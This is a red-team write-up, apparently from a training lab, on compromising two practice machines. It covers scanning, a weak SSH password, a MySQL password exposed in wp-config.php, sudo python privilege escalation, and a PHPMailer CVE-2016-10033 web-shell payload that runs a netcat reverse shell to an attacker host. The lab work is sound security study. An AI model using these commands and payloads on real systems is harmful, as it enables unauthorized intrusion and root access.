# **Red Team: Summary of Operations**

### Table of Contents

- Exposed Services
- Critical Vulnerabilities
- Exploitation

***

## Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

- ### Target1

    nmap -sV 192.168.1.110

    ![1](/Resources/Images/1/3.png)

- ### Target2

    nmap -sV 192.168.1.115

    ![1](/Resources/Images/2/3.PNG)

***

## Critical Vulnerabilities

The CVE and CWE databases give us information on vulnerabilities found in the previous step. These vulnerabilities are potential points of entry.

- ### Target1

    Vulnerability | Description | Impact
    ---|---|---
    **CWE-200** | Exposure of sensitive information to an unauthorized actor | Allowing sensitive information to be compromised so easily can result in a breach that can have consequences on your business.
    **CWE-521** | Weak Password Requirements | Not enforcing a password policy allows users to choose passwords that they can easily remember which are not typically secure.
    **CWE-284** | The software does not restrict or incorrectly restrict access to a resource from an unauthorized actor. | A user can execute elevated commands when they were not preauthorized to do so
    **CWE-98** | An improper control of filename for include or require statement in PHP allows an LFI allowing remote attackers to execute arbitrary code | An attacker can execute commands on the web server remotely allowing them to further compromise the target.

- ### Target2

    Vulnerability | Description | Impact
    ---|---|---
    **CWE-548** Exposure of information through directory browsing | A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers | Allowing a bad actor to obtain more information about your server could allow them to further their attack
    **CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer | HPMailer allows extra parameters in the mail command and consequently executes arbitrary code | An attacker can execute commands on the web server remotely allowing them to further compromise the target.

***

## Exploitation

- ## Target1

    The Red Team was able to penetrate Target1 and retrieve the following confidential data:

    **flag1.txt:**  `b9bbcb33e11b80be759c4e844862482d`

    - **CWE-200** Exposure of sensitive information to an unauthorized actor
        
        Sensitive data was spotted in plain text embedded in the code of the service site. 
        
        Exploit:
        
        |  | **Flag1** |
        | -- | -- |
        | Using Google Chrome developer's Tools on the Url: `192.168.1.110/service.html` give a glance at the exposed sensitive data. | ![2](/Resources/Images/1/5.png)
    
        

        

    ---

    **flag2.txt:** `fc3fd58dcdad9ab23faca6e9a36e581c`

    - **CWE-521:** Weak Password Requirements

        Access to the system was obtained through this weakness. The product does not require users to use strong passwords. This vulnerability makes it easier for attackers to compromise user accounts. User Michael utilizes his username as a password. Hydra can easily brute-force the password. Nevertheless, guessing the password was the efficient choice.
        
        Exploit:

        ```
            ssh michael@192.168.1.110
            Password: michael
            cd ../../
            find -iname “*flag*” 2>/dev/null
            cat /var/www/flag2.txt
        ```

        **Flag2**

        ![3](/Resources/Images/1/8.png)

    ---

    **flag3.txt:**  `afc01ab56b50591e7dccf93122770cd2`

    - **CWE-284** Server does not properly restrict access to a resource

        Privilege escalation is preceded by this vulnerability. The SQL's root password is reachable in plain text on the file wp-config.php
        
        Exploit:
    
        | MySQL Root Password | Flag3 |
        | -- | -- |
        | ``nano wp-config.php`` <br /> Password: R@v3nSecurity <br /> <br />![4](/Resources/Images/1/9.png)  | `mysql -u root -p` <br /> Password: R@v3nSecurity <br /> `mysql> show databases;` `mysql> use wordpress;` <br />  `mysql> show tables;` <br /> `mysql> select * from wp_posts;` <br />  <br />![11](/Resources/Images/1/22.png) 

        >#### note: Flag4 also appears in this exploit.

    ---

    **flag4.txt:**  `715dea6c055b9fe3337544932f2941ce`

    - **CWE-284** Improper Access Control

        Privilege on the system is obtained in this step after cracking the hashed password of a privileged user found in the SQL database. This allows the execution of a Python Script that leads to root access to the system.
    
        The user Steven has python root access. This led to a root privilege escalation.

        Exploit:
        
        1. Steven has the privilege to run python language as a root user
            ```   
                su steven
                Password: pink84
                sudo -l  
            ```
        
            ![8](/Resources/Images/1/16.png)

        2. Python Script
        
            sudo python -c 'import pty;pty.spawn("/bin/bash")' | **Flag4**: cat /root/flag4.txt
            ---|---
            ![9](/Resources/Images/1/17.png) |   ![10](/Resources/Images/1/19.png)

---

- ## Target2

    The Red Team was able to penetrate Target 2 and retrieve the following confidential data:

    **flag1.txt:**  `a2c1f66d28051bd3a5874b5b6r43e21`

    - **CWE-548** Exposure of information through directory browsing
        
        Sensitive information was accessed without authorization through directory browsing. 
        
        The vendor directory has no restrictions and is accessible through the browser. It includes several sensitive files that leak information about the services in use, their versions, and the critical data `flag1{a2c1f66d28051bd3a5874b5b6r43e21}` in the PATH file.

        ---

        **Vendor Directory Index view from the browser** | PATH File: **Flag1** | **PHPMAILER version**
        ---|---|---
        ![6](/Resources/Images/2/6.PNG) | ![7](/Resources/Images/2/7.PNG) | ![9](/Resources/Images/2/9.PNG)    

    ---

    **flag2.txt:**  `6a8ed560f0b5358ecf844108048eb337`

    **flag3.txt:**  `a0f568aa9de277887f37730d71520d9b`

    - **CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer

        The current version of PHPMailer in use (5.2.16) is vulnerable. It allows extra parameters in the mail command and consequently executes arbitrary code. Therefore, the exploited machine can establish stealthy communication with a Command and Control through a reverse shell that will bypass the inbound rules of a firewall.

        1. First, a customized script uploads a file to the vulnerable machine. The file allows the execution of NetCat in the exploited machine.

        2.  Second, a Command and Control is configured to listen using a NetCat command. 

        3. Finally, the exploited machine is instructed to call the Command and Control via a designed payload running in a browser. The payload has embedded a Netcat command to call the Command and Control machine.

            **Crafted payload:** `192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash`

            ![17](/Resources/Images/2/17.PNG)

            **Sensitive information has been found in the "www" and "WordPress uploads" directory**    

            **flag2**

            ![19](/Resources/Images/2/19.PNG)

            **flag3**

            ![20](/Resources/Images/2/20.PNG)